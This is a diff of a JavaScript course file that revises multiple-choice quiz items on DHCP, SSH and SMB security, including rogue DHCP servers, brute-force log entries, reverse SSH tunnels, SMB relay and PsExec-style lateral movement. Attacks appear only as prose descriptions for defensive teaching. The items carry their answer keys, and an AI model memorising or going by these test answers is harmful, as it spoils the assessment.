+        "question": "You find two different servers answering clients’ DHCP Discover broadcasts with Offers on a segment where only one authorised DHCP server should exist. Why is this a security concern?",
         "options": [
           {
-            "label": "It is harmless, because clients always ignore every Offer and instead configure their own IP address, gateway, and DNS entirely on their own.",
+            "label": "Mainly an availability issue: two servers may hand out the same address, causing conflicts but no interception",
             "value": "a"
           },
           {
-            "label": "A rogue DHCP server can assign victims a malicious gateway or DNS, since clients accept the first Offer, letting the attacker intercept their traffic.",
+            "label": "The extra server can give clients its own gateway or DNS, since clients take the first Offer, putting it in their path",
             "value": "b"
           },
           {
-            "label": "It simply doubles network speed, because two DHCP servers share the workload of assigning addresses and pose no security risk whatsoever.",
+            "label": "Usually harmless: a second server is how DHCP failover works, and clients use it only when the main one is down",
             "value": "c"
           },
           {
-            "label": "It only affects printers, because DHCP Offers are used exclusively to configure printing devices and never assign settings to laptops or servers.",
+            "label": "It is a starvation attack: the second server is draining the real server’s pool so new clients cannot get a lease",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "A second, unauthorised DHCP server is a rogue server: because clients accept the first Offer they receive, the attacker can hand victims a malicious default gateway or DNS server and route their traffic through attacker-controlled infrastructure for a man-in-the-middle position. The claim that clients ignore every Offer is false because clients do accept DHCP Offers rather than self-configuring. The 'doubles network speed' option wrongly frames a rogue server as a harmless performance boost. The 'only affects printers' option is incorrect because DHCP configures all kinds of devices, not just printers."
+        "explanation": "An unauthorised DHCP server is a rogue server. Clients accept the first Offer they receive, so the rogue can hand them a malicious default gateway or DNS server and route their traffic through itself (a man-in-the-middle position). Address conflicts can happen, but treating it as only an availability issue misses the interception risk. A standby server can exist in a planned failover design, but this segment should have only one authorised server, so the second one is not failover. Starvation is a different attack: a flood of fake Discovers with spoofed MACs that empties the pool, not a second server sending Offers."
       },
       {
-        "question": "A packet capture of DHCP traffic shows a client receiving two Offers from two different server-id values within the same second, and the lease was ultimately granted by the server-id not listed in your asset inventory. Which switch-level control is specifically designed to prevent this?",
+        "question": "A packet capture shows a client receiving two DHCP Offers from two different server-id values within the same second, and the lease was granted by the server-id that is not in your asset inventory. Which switch-level control is specifically designed to stop this?",
         "options": [
           {
-            "label": "DHCP snooping, which only allows DHCP server replies like Offers and ACKs from switch ports explicitly marked as trusted.",
+            "label": "DHCP snooping, which lets DHCP server replies (Offers and ACKs) through only from ports marked as trusted",
             "value": "a"
           },
           {
-            "label": "DHCP audit logging, because simply recording DHCP events in a log file automatically blocks any unauthorised server from replying.",
+            "label": "Dynamic ARP Inspection, which drops forged address-resolution replies before they can reach the clients",
             "value": "b"
           },
           {
-            "label": "Port mirroring, because copying switch traffic to a monitoring port on its own prevents any second DHCP server from responding.",
+            "label": "Option 82, which has the switch record the physical port and switch that each DHCP request arrived on",
             "value": "c"
           },
           {
-            "label": "VLAN tagging, because separating devices into VLANs by itself stops any device from ever sending a DHCP Offer message.",
+            "label": "A DHCP relay agent, which forwards Discovers to the central server so that only that server can answer",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "DHCP snooping classifies switch ports as trusted or untrusted and drops DHCP server traffic (Offers/ACKs) arriving on untrusted ports, which is exactly the control that stops a rogue server plugged into a normal access port from ever reaching victims. The DHCP audit logging option wrongly claims logging alone blocks anything — logging is only visibility, not prevention. The port mirroring option misapplies port mirroring, a monitoring feature with no blocking capability. The VLAN tagging option is wrong because VLANs segment broadcast domains but do not, by themselves, validate which devices may act as a DHCP server."
+        "explanation": "DHCP snooping marks the port to the real DHCP server as trusted and every user port as untrusted, then drops any Offer or ACK arriving on an untrusted port, so a rogue server plugged into an ordinary port never reaches the clients. Dynamic ARP Inspection builds on snooping’s binding table to stop forged ARP replies; it does not filter DHCP Offers. Option 82 records where a request came from, which helps investigation and pool assignment, but it does not block anything. A relay agent forwards broadcasts across subnets; it does not stop a rogue device on the local segment from answering the broadcast itself."
       },
       {
-        "question": "A DHCP client's lease reaches its T1 timer (50% of the lease duration) but no DHCPACK has arrived yet by T2 (87.5%). What does the client do differently at each stage?",
+        "question": "A DHCP client reaches its T1 timer (50% of the lease) and gets no reply from its server, then reaches T2 (87.5%) still without a DHCPACK. What does the client do at each stage?",
         "options": [
           {
-            "label": "At T1 the client unicasts a DHCPREQUEST only to the original leasing server; at T2 it broadcasts a DHCPREQUEST to any DHCP server on the segment.",
+            "label": "At T1 it unicasts a DHCPREQUEST to the server that issued the lease; at T2 it broadcasts one to any server",
             "value": "a"
           },
           {
-            "label": "At T1 the client immediately releases its address and restarts the full DORA broadcast exchange from scratch, then repeats this again at T2 as well.",
+            "label": "At T1 it broadcasts a DHCPREQUEST to any server; at T2 it unicasts one to the server that issued the lease",
             "value": "b"
           },
           {
-            "label": "At T1 the client does nothing at all, and only at T2 does it silently keep the same IP address forever without ever contacting a server again.",
+            "label": "At T1 it unicasts a DHCPREQUEST to the server that issued the lease; at T2 it drops the address and restarts DORA",
             "value": "c"
           },
           {
-            "label": "At T1 the client changes its MAC address to force a new lease, and at T2 it requests an address on a completely different subnet.",
+            "label": "At T1 it broadcasts a fresh DHCPDISCOVER; at T2 it sends a DHCPRELEASE and waits for a server to respond",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "RFC 2131 defines T1 as the point the client enters RENEWING and quietly unicasts a DHCPREQUEST to its original server, and T2 as the point it enters REBINDING and broadcasts a DHCPREQUEST to any server if the original never answered. The release-and-restart-DORA option invents a full-restart behaviour that doesn't happen at T1. The 'does nothing at T1' option is false because the client actively tries to renew, not passively keep the address. The MAC-change option fabricates MAC changing and subnet switching, which DHCP renewal never does."
+        "explanation": "At T1 the client enters RENEWING and quietly unicasts a DHCPREQUEST to the server that issued its lease. If that server stays silent, at T2 it enters REBINDING and broadcasts a DHCPREQUEST so any DHCP server can renew it. The second option reverses the two stages. Giving up the address and restarting DORA happens only when the lease fully expires, not at T2. A renewing client does not start over with a Discover at T1, and DHCPRELEASE is how a client gives an address back, not how it asks to keep one."
       },
       {
-        "question": "A client on a subnet with no local DHCP server successfully receives a lease from a central DHCP server on a different subnet. Which mechanism made this possible, and what field does it rely on?",
+        "question": "A client on a subnet with no local DHCP server receives a lease from a central DHCP server on a different subnet. Which mechanism made this possible, and which field does the server rely on?",
         "options": [
           {
-            "label": "A DHCP relay agent (often the local router) forwards the broadcast to the central server and sets the giaddr field so the server knows which subnet's scope to use and where to send the reply.",
+            "label": "A relay agent (usually the local router) forwards the Discover and sets giaddr so the server picks the right scope",
             "value": "a"
           },
           {
-            "label": "DHCP snooping automatically extends its own address pool across every subnet in the building without any relay agent or additional field being involved.",
+            "label": "The local router forwards the broadcast as it is, and the server picks the right scope from the client’s MAC",
             "value": "b"
           },
           {
-            "label": "The client itself opens a direct TCP connection on port 445 to the central DHCP server and requests an address using its own hostname as the field.",
+            "label": "The access switch adds Option 82, which lets the Discover cross the router by itself without any relay",
             "value": "c"
           },
           {
-            "label": "Option 82 encrypts the DHCPDISCOVER message end-to-end so it can cross subnet boundaries without any relay device forwarding it at all.",
+            "label": "The client unicasts its Discover to the central server, finding its address in Option 54 (Server Identifier)",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "A DHCP relay agent unicasts the Discover across the subnet boundary a plain broadcast cannot cross, stamping its own address into the giaddr field so the central server knows which subnet's scope to use and where to route its reply back through. The pool-extending snooping option misapplies DHCP snooping, an unrelated switch-port trust feature. The TCP port 445 option is wrong because DHCP is UDP-based on ports 67/68, not a TCP 445 (SMB) connection. The end-to-end encryption choice incorrectly claims Option 82 provides encryption; it actually records physical location information."
+        "explanation": "Routers do not forward broadcasts, so a relay agent (the local router or Layer-3 switch) unicasts the Discover to the central server and writes its own address into giaddr. The server uses giaddr to choose the scope for that subnet and as the address to send its reply back through. A router passing the broadcast through unchanged is exactly what does not happen, and a MAC address says nothing about which subnet the client is on. Option 82 is information a relay or switch adds about the port; it does not let a broadcast cross a router. A new client has no address and does not yet know any server; Option 54 is how servers identify themselves in their Offers."
       },
       {
-        "question": "Reviewing a Windows DHCP server audit log during an incident, you see a burst of event ID 14 entries followed by clients failing to get addresses. What does ID 14 mean, and what attack fits this pattern?",
+        "question": "Reviewing a Windows DHCP server audit log during an incident, you see a burst of lines with event ID 14, and at the same time clients start failing to get addresses. What does ID 14 mean, and what fits this pattern?",
         "options": [
           {
-            "label": "ID 14 is 'address pool exhausted' — a DHCP starvation attack flooding DISCOVERs with spoofed MACs can drain the scope so legitimate clients get no lease.",
+            "label": "Pool exhausted: a starvation attack flooding spoofed-MAC Discovers can drain the scope so real clients get none",
             "value": "a"
           },
           {
-            "label": "ID 14 means a lease was renewed normally; a burst of renewals is always benign background traffic.",
+            "label": "Address already in use: a device with a static IP is clashing with the scope, so clients decline their offers",
             "value": "b"
           },
           {
-            "label": "ID 14 is 'log stopped', so the server simply shut down and nothing else can be inferred.",
+            "label": "Lease denied: the server is refusing clients it does not recognise, which points to a misconfigured MAC filter",
             "value": "c"
           },
           {
-            "label": "ID 14 is a DNS dynamic update success; it has nothing to do with address assignment.",
+            "label": "Lease deleted: an admin is clearing old leases from the scope, so clients fail briefly until they try again",
             "value": "d"
           }
         ],
-        "explanation": "In the Windows DHCP audit log, event ID 14 means a lease request could not be satisfied because the scope's address pool was exhausted. A flood of ID 14 events, with clients unable to obtain addresses, is the signature of DHCP starvation — an attacker draining the pool with many spoofed-MAC DISCOVER requests.",
+        "explanation": "In the Windows DHCP audit log, ID 14 means a lease request failed because the scope’s address pool was exhausted. A burst of ID 14 while clients cannot get addresses is the signature of DHCP starvation: many Discovers with spoofed MACs draining the pool (or, less often, a runaway device). “Address already in use” is ID 13, “lease denied” is ID 15 and “lease deleted” is ID 16; none of those means the pool has run out.",
         "answer": "a"
       }
     ],
@@ -9119,70 +9211,70 @@ const NEW_TOPIC_LESSONS = [
         "question": "Why did SSH replace Telnet as the standard tool for remotely administering servers, and on which port does SSH listen?",
         "options": [
           {
-            "label": "SSH encrypts the entire session including credentials and commands, whereas Telnet sent everything as readable plaintext an eavesdropper could capture; SSH uses TCP port 22.",
+            "label": "SSH encrypts the entire session — credentials and commands — whereas Telnet sent everything as readable plaintext anyone could capture; SSH uses TCP port 22.",
             "value": "a"
           },
           {
-            "label": "SSH automatically assigns IP addresses to the servers it connects to, which Telnet could not do, and it listens on UDP port 67 to hand out those addresses.",
+            "label": "SSH replaced Telnet mainly because it adds built-in file transfer on top of a remote shell, which Telnet lacked; SSH listens on TCP port 23.",
             "value": "b"
           },
           {
-            "label": "SSH is faster than Telnet because it skips all encryption to save time, and it listens on TCP port 3389 to reach remote desktops more quickly.",
+            "label": "SSH is preferred because it compresses traffic to run noticeably faster sessions than Telnet ever could; SSH listens on TCP port 21.",
             "value": "c"
           },
           {
-            "label": "SSH and Telnet are equally secure, but SSH became standard only because it uses a more memorable port number, which happens to be TCP port 21.",
+            "label": "SSH and Telnet are equally secure, but SSH won out because it works across more operating systems; SSH listens on TCP port 2222.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "SSH replaced Telnet because it encrypts the whole session — credentials and commands included — while Telnet transmitted everything in readable plaintext that anyone capturing traffic could steal; SSH listens on TCP port 22. The address-assigning option describes DHCP (port 67), not SSH. The 'skips all encryption' option is wrong because SSH does not skip encryption and 3389 is RDP. The 'equally secure' option is false because Telnet is insecure and 21 is FTP, not SSH."
+        "explanation": "Correct: SSH's decisive advantage is that it encrypts the whole session — credentials and commands — while Telnet sent everything in cleartext that anyone on the path could read; SSH listens on TCP port 22. The file-transfer option names a genuine SSH capability but the wrong reason it displaced Telnet, and port 23 is in fact Telnet's own port. The compression option is wrong on both counts: security, not speed, drove adoption, and port 21 belongs to FTP. The equally-secure option is simply false — Telnet's lack of encryption is the whole point — and 2222 is only a common non-standard alternative."
       },
       {
         "question": "On an internet-facing Linux server you see hundreds of 'Failed password for root' entries from one IP over a few minutes, followed by a single 'Accepted password for root' from the same IP. What has most likely happened?",
         "options": [
           {
-            "label": "A routine backup completed, because backup software authenticates over SSH by deliberately failing hundreds of password attempts before finally succeeding once.",
+            "label": "A credential-stuffing attack replaying breached username and password pairs, where the failures are tried pairs and the success is a reused leaked credential.",
             "value": "a"
           },
           {
-            "label": "A successful SSH brute-force attack: the attacker guessed the root password after many attempts, and the 'Accepted' entry indicates a likely compromise to investigate.",
+            "label": "A successful SSH brute-force: the attacker guessed the root password after many attempts, and the 'Accepted' entry indicates a likely compromise to investigate.",
             "value": "b"
           },
           {
-            "label": "Nothing of concern, because repeated failed root logins from a single external IP are the normal, expected way administrators log in to production servers.",
+            "label": "A password spray, where one common password is tried across many accounts, which is why so many attempts appear before one finally works.",
             "value": "c"
           },
           {
-            "label": "The server's clock drifted, because time-synchronisation errors are logged by SSH as a burst of failed passwords followed by one accepted password entry.",
+            "label": "Routine automated administration, since scheduled jobs often log several failed root logins before the correct credential eventually succeeds.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Many failed password attempts followed by an 'Accepted password' from the same source is the classic signature of a brute-force attack that finally guessed the credentials — here for the powerful root account — indicating a likely compromise that must be investigated. The 'routine backup' option invents backup behaviour that does not exist. The 'nothing of concern' option wrongly normalises brute-force activity. The clock-drift option is false because clock drift is not logged as failed/accepted password attempts."
+        "explanation": "Correct: many password failures against a single account (root) from one IP, ending in an 'Accepted password', is a classic SSH brute-force that succeeded — a likely compromise to investigate immediately. The credential-stuffing option mislabels the pattern: stuffing replays known pairs across many accounts, not hundreds of guesses against one. The password-spray option is the opposite shape too — spraying tries one password across many accounts, whereas here one account is hammered with many passwords. The routine-administration option is wrong: well-configured automation uses keys and does not repeatedly fail root password logins before succeeding."
       },
       {
         "question": "A system administrator SSHes into a server they have connected to for months and this time receives a 'WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED' error instead of the usual silent connection. What should they do, and why?",
         "options": [
           {
-            "label": "Ignore the warning and connect anyway, because SSH host key warnings are purely cosmetic and never indicate a real change to the server.",
+            "label": "Delete the matching known_hosts entry and reconnect, since host keys routinely rotate during server updates and the warning is just a stale saved record.",
             "value": "a"
           },
           {
-            "label": "Investigate before connecting, because the presented host key no longer matches the trusted one, which can mean a rebuild or a man-in-the-middle attack.",
+            "label": "Investigate before connecting, because the presented host key no longer matches the trusted one, which can mean a legitimate rebuild or a man-in-the-middle attack.",
             "value": "b"
           },
           {
-            "label": "Immediately reformat the local laptop, because a host key warning always means the administrator's own machine has been compromised by malware.",
+            "label": "Connect anyway but switch to password authentication, since the warning affects only key-based logins and passwords are unaffected by a changed host key.",
             "value": "c"
           },
           {
-            "label": "Switch the connection to Telnet instead, since Telnet does not check host keys and therefore avoids triggering this same warning entirely.",
+            "label": "Set StrictHostKeyChecking to no so the new key is accepted automatically and the workflow is not interrupted by this warning again.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "A host-key-changed warning means the key the server just presented no longer matches the one saved from earlier trusted connections; this can be an authorized server rebuild, but it can also mean traffic is being intercepted by an impostor machine, so the administrator must investigate the cause before connecting rather than clicking past it. The 'ignore the warning' option dismisses a warning that exists precisely to catch this risk. The 'reformat the local laptop' option wrongly blames the local machine instead of the server-identity mismatch. The 'switch to Telnet' option proposes downgrading to insecure, plaintext Telnet, which is not a fix and removes protection entirely."
+        "explanation": "Correct: the warning means the server's presented host key no longer matches the one saved at first use, which can be a legitimate rebuild or an active man-in-the-middle, so the right move is to find out why before trusting the connection. The delete-and-reconnect option is exactly the dangerous reflex the lesson warns against — host keys do not rotate on ordinary updates, so clearing the entry blindly can walk you straight into an interception. The password-switch option is wrong: a changed host key affects the server's identity check regardless of which user-auth method follows. Disabling StrictHostKeyChecking removes the very protection that just caught the anomaly."
       },
       {
         "question": "Which SSH authentication method is specifically designed to support challenge-response prompts such as one-time-password codes or PAM-based multi-factor authentication?",
@@ -9192,65 +9284,65 @@ const NEW_TOPIC_LESSONS = [
             "value": "a"
           },
           {
-            "label": "hostbased, which authenticates the connection purely using the trust relationship between the local machine's own hostname and DNS records.",
+            "label": "hostbased, which authenticates using the client machine's own host key rather than prompting the user, so it cannot relay an OTP challenge.",
             "value": "b"
           },
           {
-            "label": "The Transport Layer Protocol, which is solely responsible for negotiating encryption algorithms and never participates in authenticating a user at all.",
+            "label": "publickey, which proves identity with a key pair in a single non-interactive step and therefore never issues a prompt for an OTP code.",
             "value": "c"
           },
           {
-            "label": "The Connection Protocol, which only multiplexes already-authenticated channels and therefore cannot prompt a user for any credential.",
+            "label": "the password method, which accepts just one static secret and has no mechanism to carry a second challenge-response factor such as an OTP.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "keyboard-interactive (RFC 4256) is the SSH authentication method built to relay arbitrary prompts from the server to the user, such as a one-time-password code or a PAM MFA challenge, before authentication completes. The hostbased option describes hostbased authentication, a different, rarely used method. The Transport Layer Protocol and Connection Protocol options correctly describe those layers' real jobs (encryption setup, and channel multiplexing) but neither performs user authentication."
+        "explanation": "Correct: keyboard-interactive (RFC 4256) exists precisely to relay arbitrary server prompts — an OTP code, a PAM/MFA challenge — to the user, making it the usual vehicle for multi-factor SSH. The hostbased option trusts the client machine's host key instead of the user, so it issues no prompt and cannot carry a challenge. The publickey option authenticates non-interactively with a key pair and asks nothing of the user. The password option accepts a single static secret and has no way to add a second challenge-response factor."
       },
       {
         "question": "A compromised internal workstation, sitting behind a firewall that blocks all inbound connections, is later found reachable by an external attacker over SSH. Which SSH feature most likely made this possible, and how?",
         "options": [
           {
-            "label": "Remote port forwarding (ssh -R), where the workstation initiated an outbound SSH connection to attacker infrastructure and opened a port there that tunnels back to itself.",
+            "label": "Remote port forwarding (ssh -R), where the workstation made an outbound SSH connection to attacker infrastructure and opened a port there that tunnels back to itself.",
             "value": "a"
           },
           {
-            "label": "Local port forwarding (ssh -L) run entirely from the attacker's own machine, which requires no outbound connection whatsoever from the victim workstation.",
+            "label": "Local port forwarding (ssh -L) run from the attacker's own machine, which would need no outbound connection from the victim workstation at all.",
             "value": "b"
           },
           {
-            "label": "DHCP snooping being disabled on the workstation's switch port, which by itself grants any external IP address full inbound SSH access.",
+            "label": "Dynamic forwarding (ssh -D) turning the attacker's host into a SOCKS proxy, which on its own exposes the firewalled workstation to inbound access.",
             "value": "c"
           },
           {
-            "label": "SMB signing being turned off on the workstation, since disabling SMB signing directly opens an SSH listener reachable from the internet.",
+            "label": "An SSH listener left directly exposed on port 22 through the firewall, reachable simply because inbound port 22 was never actually blocked.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Remote port forwarding lets a host that can only make outbound connections open a port on the remote server that tunnels back to itself, giving an attacker inbound-like access through a firewall that only ever observes the victim's own outbound SSH connection. Local port forwarding (ssh -L) requires an outbound connection from the attacker to the workstation, which the firewall blocks. The remaining options misapply unrelated controls (DHCP snooping and SMB signing) that have no bearing on SSH reachability."
+        "explanation": "Correct: remote forwarding (ssh -R) is the classic reverse-tunnel — the victim makes an allowed outbound SSH connection to attacker infrastructure and opens a listening port there that forwards back into the workstation, defeating a firewall that only blocks inbound. The local-forwarding option fails because ssh -L from the attacker would still require reaching the victim inbound, which the firewall blocks. The dynamic-forwarding option describes a SOCKS proxy for outbound pivoting, not a way to reach the victim inbound. The exposed-port-22 option contradicts the scenario, which states all inbound connections are blocked."
       },
       {
-        "question": "Your servers are supposed to be key-only. In /var/log/auth.log you find many 'Failed password for invalid user' lines from one IP, then 'Accepted password for backup from' that same IP. Why is this alarming?",
+        "question": "Your servers are supposed to be key-only, yet in /var/log/auth.log you find an 'Accepted password for backup' entry after a burst of username-guessing failures from the same IP. Which single sshd_config change would have prevented that password login outright?",
         "options": [
           {
-            "label": "A password login succeeded on a key-only server after a username-guessing brute force from the same IP — both the method and the preceding failures indicate a compromised account.",
+            "label": "Setting PasswordAuthentication no, which disables password logins entirely so only key-based authentication is ever accepted.",
             "value": "a"
           },
           {
-            "label": "It is normal: 'invalid user' lines always precede every legitimate publickey login as part of the handshake.",
+            "label": "Setting PermitRootLogin no, which blocks the root account but would still have let the 'backup' account log in with a password.",
             "value": "b"
           },
           {
-            "label": "Accepted password is only ever written by the server's own health check, so no external login occurred.",
+            "label": "Setting MaxAuthTries 3, which disconnects after three attempts per connection but still permits a password login once one is guessed.",
             "value": "c"
           },
           {
-            "label": "The messages are harmless because auth.log never records the source IP of a login.",
+            "label": "Setting AllowUsers backup, which restricts who may connect but still lets the backup account authenticate with a password.",
             "value": "d"
           }
         ],
-        "explanation": "On a key-only server (PasswordAuthentication no) an 'Accepted password' line should never appear, and here it follows a burst of 'Failed password for invalid user' from the same IP — the signature of a brute force that enumerated a valid account and then logged in. The auth log records the method, username, and source IP, which is exactly what makes the sequence readable.",
+        "explanation": "Correct: PasswordAuthentication no turns off password logins across the board, so on a key-only server the 'Accepted password for backup' could never have happened. PermitRootLogin no only constrains root, leaving the backup account's password login possible. MaxAuthTries 3 just caps attempts per connection — a guesser reconnecting still gets in once the password is right. AllowUsers backup limits which accounts may connect but does nothing to stop that account from using a password.",
         "answer": "a"
       }
     ],
@@ -9329,142 +9421,142 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "During an incident you observe one workstation making SMB connections (port 445) to dozens of other machines within a few minutes, several reaching their C$ and ADMIN$ shares with administrative credentials. What does this pattern most strongly indicate?",
+        "question": "Condensed Event ID 5140 entries show: 09:41:02 Share=\\\\WKS-030\\ADMIN$ Account=helpdesk.t2 Source=WKS-207; 09:41:06 Share=\\\\WKS-033\\ADMIN$ (same account and source); 09:41:11 Share=\\\\WKS-052\\ADMIN$; 09:41:17 Share=\\\\SRV-FS02\\C$. No helpdesk ticket mentions these hosts. What is the best assessment?",
         "options": [
           {
-            "label": "Normal file browsing, because a single user legitimately opens the hidden C$ administrative share on dozens of colleagues' machines during ordinary daily work.",
+            "label": "Routine helpdesk support, since helpdesk accounts are expected to use admin shares when fixing users' machines.",
             "value": "a"
           },
           {
-            "label": "Lateral movement: the attacker is using SMB and admin shares to reach and run tools on many machines, the classic PsExec-style spread through a network.",
+            "label": "Likely lateral movement: one workstation reaching ADMIN$ on several hosts in seconds, ending at a server's C$.",
             "value": "b"
           },
           {
-            "label": "A DNS misconfiguration, because SMB fan-out on port 445 is the standard symptom of a name-resolution failure rather than any attacker activity.",
+            "label": "Likely an SMBv1 sweep, with the source testing which hosts still accept the legacy dialect before connecting.",
             "value": "c"
           },
           {
-            "label": "Routine printing, because sending one document to the office printer requires opening the C$ and ADMIN$ shares on every workstation in the building.",
+            "label": "Likely null-session reconnaissance, with the source listing shares anonymously, which 5140 logs as ADMIN$ access.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "One host rapidly connecting to many others on port 445, reaching C$/ADMIN$ admin shares with administrative credentials, is the classic lateral-movement fan-out — the PsExec-style pattern of copying and running tools across machines. The normal file browsing option is wrong because normal users do not open hidden admin shares on dozens of colleagues' machines. The DNS misconfiguration option misattributes an SMB pattern to DNS. The routine printing option is false because printing does not require admin-share access on every workstation."
+        "explanation": "One source touching hidden admin shares on many machines within seconds, with one account and ending at C$ on a server, is the fan-out signature of PsExec-style lateral movement. The next step is to find which process on WKS-207 made the connections and whether files were written to ADMIN$ or C$. \"Routine helpdesk support\" is wrong: helpdesk work is ticket-driven and touches one machine at a time, not a scripted sweep with no matching tickets. \"An SMBv1 sweep\" is wrong: 5140 records a share that was actually accessed, not a dialect probe, and nothing in these lines shows a dialect. \"Null-session reconnaissance\" is wrong: a null session is anonymous and targets IPC$, while these entries show a named account reaching ADMIN$ and C$."
       },
       {
-        "question": "The WannaCry ransomware spread automatically from machine to machine across networks in 2017. Which protocol and weakness did it exploit, and what is the key hardening lesson?",
+        "question": "A SIEM report lists the negotiated SMB dialect for four devices: HR laptop 0x0311, file server 0x0302, old print server 0x0210, and a lab scanner that negotiated NT LM 0.12. Which device should you raise as a finding first, and why?",
         "options": [
           {
-            "label": "It exploited SSH on port 22 by brute-forcing passwords, so the lesson is to enforce long passwords and disable root login on every server.",
+            "label": "The print server, because SMB 2.1 has no encryption and is therefore the most exploitable session listed.",
             "value": "a"
           },
           {
-            "label": "It exploited the EternalBlue vulnerability in the old SMBv1 protocol, so the lesson is to disable SMBv1 and keep SMB patched.",
+            "label": "The lab scanner, because SMB1 is the EternalBlue-era dialect that a hardened network should never negotiate.",
             "value": "b"
           },
           {
-            "label": "It exploited DHCP starvation on ports 67 and 68, so the lesson is to limit the address pool and monitor for exhausted leases on the network.",
+            "label": "The HR laptop, because 3.1.1 pre-authentication integrity shows that someone tampered with its negotiation.",
             "value": "c"
           },
           {
-            "label": "It exploited HTTPS on port 443 by breaking TLS encryption, so the lesson is to rotate certificates and disable older cipher suites everywhere.",
+            "label": "The file server, because any session below 3.1.1 lacks downgrade protection and so shows an active downgrade.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "WannaCry spread using EternalBlue (MS17-010), a vulnerability in the legacy SMBv1 protocol, which let the worm move machine-to-machine automatically; the hardening lesson is to disable SMBv1 and keep SMB patched. The SSH port 22 option describes SSH brute force, unrelated to WannaCry's propagation. The DHCP starvation option describes a DHCP attack, not the SMB exploit used. The HTTPS/TLS option wrongly attributes it to breaking TLS on HTTPS."
+        "explanation": "NT LM 0.12 is SMB1, the dialect whose flaws EternalBlue and WannaCry exploited. Modern Windows will not negotiate it unless the legacy feature was re-enabled, so it means an ancient device or a deliberate downgrade, and it is a finding on its own. \"The print server\" is wrong as a first priority: SMB 2.1 is older and lacks SMB3 encryption, but it is a supported dialect, not the known-exploited one. \"The HR laptop\" is wrong: pre-authentication integrity is a protection built into 3.1.1; negotiating 3.1.1 is the modern, healthy result, not evidence of tampering. \"The file server\" is wrong: lacking the 3.1.1 downgrade protection is a weaker posture, but it is not evidence that a downgrade happened, since 3.0.2 may simply be the highest dialect both sides share."
       },
       {
-        "question": "An attacker captures an SMB authentication attempt on the network and relays it unmodified to a different server, successfully logging in as the victim without ever learning their password. Which SMB protection is designed to prevent exactly this?",
+        "question": "A red-team report shows a captured SMB authentication being relayed, unchanged, to a file server, where it logged in as the victim without the password ever being known. Which control is designed to make the file server reject exactly this?",
         "options": [
           {
-            "label": "SMB signing, because it cryptographically signs each message so a relayed or tampered message is rejected by the receiving server.",
+            "label": "Require SMB signing, so a relayed message without a valid signature from the real session is rejected.",
             "value": "a"
           },
           {
-            "label": "DHCP snooping, because it validates DHCP server traffic and therefore also blocks any relayed SMB authentication attempt on the network.",
+            "label": "Disable SMBv1 everywhere, since relaying depends on flaws in the legacy SMB1 dialect.",
             "value": "b"
           },
           {
-            "label": "Anonymous null sessions, because disabling anonymous access automatically re-encrypts every SMB authentication message end to end.",
+            "label": "Block null sessions to IPC$, so the attacker cannot use an anonymous connection to relay logons.",
             "value": "c"
           },
           {
-            "label": "UNC path hardening, because renaming the \\\\server\\share format prevents an attacker from ever relaying a captured authentication attempt.",
+            "label": "Move every host to 3.1.1, whose pre-authentication integrity stops a captured logon being replayed.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "SMB signing adds a cryptographic signature to each message so the receiving server can detect a relayed or tampered message and reject it, which is exactly what defeats an SMB relay attack; Microsoft has moved to requiring signing by default for this reason. The DHCP snooping option misapplies DHCP snooping, an unrelated Layer 2 defense against rogue DHCP servers. The anonymous null sessions option confuses null-session hardening (which limits anonymous enumeration) with signing/encryption. The UNC path hardening option invents a defense based on renaming UNC paths, which has no bearing on relay attacks."
+        "explanation": "SMB signing adds a cryptographic signature to each message, so the receiving server can tell that a relayed message did not come from a genuine signed session and rejects it. This is why the lesson recommends requiring signing, especially toward domain controllers. \"Disable SMBv1 everywhere\" is wrong: disabling SMBv1 is good hardening against EternalBlue-style flaws, but relay abuses NTLM authentication and works over newer dialects too. \"Block null sessions to IPC$\" is wrong: null sessions are anonymous enumeration; a relay passes on a real user's authentication, so anonymous access is not involved. \"Move every host to 3.1.1\" is wrong: pre-authentication integrity protects the dialect negotiation from tampering (downgrades); it does not stop a valid authentication being forwarded to another server."
       },
       {
-        "question": "A remote-administration tool connects to \\\\SRV-DB01\\IPC$ and opens the \\PIPE\\svcctl named pipe to remotely create and start a service. What is actually happening at the protocol level?",
+        "question": "A packet capture shows workstation WKS-041 connect to \\\\SRV-DB01\\ADMIN$, then a few seconds later to \\\\SRV-DB01\\IPC$, where it opens the named pipe svcctl. What is the most likely purpose of that pipe connection?",
         "options": [
           {
-            "label": "The tool is using SMB's IPC$ share to carry an RPC call to the Service Control Manager — the same underlying mechanism PsExec-style tools use to execute code remotely.",
+            "label": "An RPC call to the Service Control Manager to create and start a service, such as for a file dropped on ADMIN$.",
             "value": "a"
           },
           {
-            "label": "The tool is opening a regular file named svcctl stored on the C: drive of SRV-DB01 and directly editing its raw file contents over the network.",
+            "label": "An RPC call to the Server service to list which shares SRV-DB01 exposes, a common recon step before copying files.",
             "value": "b"
           },
           {
-            "label": "The tool is bypassing SMB entirely and instead using a plaintext Telnet session on port 23 to send commands directly to the Service Control Manager.",
+            "label": "An RPC call to the Security Account Manager to enumerate SRV-DB01's local users and groups as reconnaissance.",
             "value": "c"
           },
           {
-            "label": "The tool is exploiting a DNS misconfiguration, since named pipes are actually a DNS record type used only to resolve remote server names.",
+            "label": "An RPC call to Remote Registry to read or change SRV-DB01's registry, for example to add a persistence key.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "IPC$ exposes named pipes, not files, and opening \\PIPE\\svcctl carries an RPC call to the Service Control Manager — exactly the mechanism PsExec-style tools use to remotely create and start a service. The 'regular file named svcctl' option wrongly treats a named pipe as an ordinary file on disk. The Telnet option invents an unrelated Telnet channel. The DNS-misconfiguration option confuses named pipes with an unrelated DNS concept."
